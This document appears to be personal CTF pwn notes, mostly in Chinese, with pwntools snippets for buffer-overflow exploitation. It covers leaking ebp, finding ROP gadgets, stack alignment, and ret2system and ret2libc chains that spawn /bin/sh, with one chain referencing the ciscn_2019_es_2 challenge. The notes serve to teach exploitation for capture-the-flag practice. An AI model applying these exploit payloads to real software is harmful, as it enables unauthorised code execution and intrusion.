## scanf用sendline, read用send
## 溢出读取ebp值
sendline 发送时\n 会占一个字符 0x4大小发 `sendline 'a'*4` 会发5个字符引发问题。

举例
```c
char s[40]; // [ebp-28h]
read(0, s, 0x30u);


// 要输出 ebp 需要 0x20 个字节这时只要覆盖最后的 00 即可输出 ebp，用send不用sendline
payload1 = b'A' * (0x27) + b'B'
p.send(payload1)  # not sendline
p.recvuntil("B")
original_ebp = u32(p.recv(4))
```
### 填充指定大小
```py
'a'.ljust(268, ' ')
```
## 使用默认的libc

```
elf = ELF("./canary")
libc = elf.libc
```

## find leave asm

```python
leave_ret = elf.search(asm('leave')).__next__()

pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = ROP(elf).find_gadget(['pop rsi'])[0]
print(hex(pop_rdi))
```
## snippets
```python
ss = lambda data: p.send(str(data))
sa = lambda delim, data: p.sendafter(str(delim), str(data))
sl = lambda data: p.sendline(data)
sls = lambda data: p.sendline(str(data))
sla = lambda delim, data: p.sendlineafter(str(delim), str(data))
r = lambda num: p.recv(num)
ru = lambda delims, drop=True: p.recvuntil(delims, drop)
itr = lambda: p.interactive()
uu32 = lambda data: u32(data.ljust(4, b'\x00'))
uu64 = lambda data: u64(data.ljust(8, b'\x00'))
leak = lambda name, addr: log.success('{} = {:#x}'.format(name, addr))
l64 = lambda: u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
l32 = lambda: u32(p.recvuntil("\xf7")[-4:].ljust(4, b"\x00"))
```

# Stack

## 栈对齐

```python
rop = ROP(elf)
rop.raw(b'a' * (64 + 8))
rop.raw(flat(ret)) # 方式1. 加个ret即可
rop.call(system, [bin_sh]) # 栈对齐

# 方式2 不加ret 加参数 rop.call(system, [bin_sh, '0']) # 栈对齐
```
## ret2system

```sh
# ciscn_2019_es_2
elf.plt['system'] + p32(0) + binsh_addr  # 是地址不是 "/bin/sh" 字符
payload =p32(0) + p32(elf.plt['system']) + p32(0) + p32(stdin_addr+0x10) + b'/bin/sh\x00'
payload = payload.ljust(0x28, '\x00')
```

# rop

见 pwn_01_stack_03_ret2libc_x64_00_ctfhub_bypwntool_rop.py
```sh
rop = ROP('./ret2libc') # x64
rop.raw(b'A' * (144 + 8))  # 填充144 + fake_rbp(8) 个字节的数据到缓冲区中
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
# rop.call 会自动 pop rdi, ret来传入参数
rop.call(puts_plt, [puts_got]) # puts_plt(puts_got, arg2, arg3, arg4, ...)
rop.call('main')  # 自动构建下一步的ret调用main函数，使程序重新运行
p.sendline(rop.chain())

# 再发送时要重新构建 rop
rop = ROP('./ret2libc')
rop.raw(b'A' * (144 + 8))
rop.call(system_addr, [binsh_addr])
```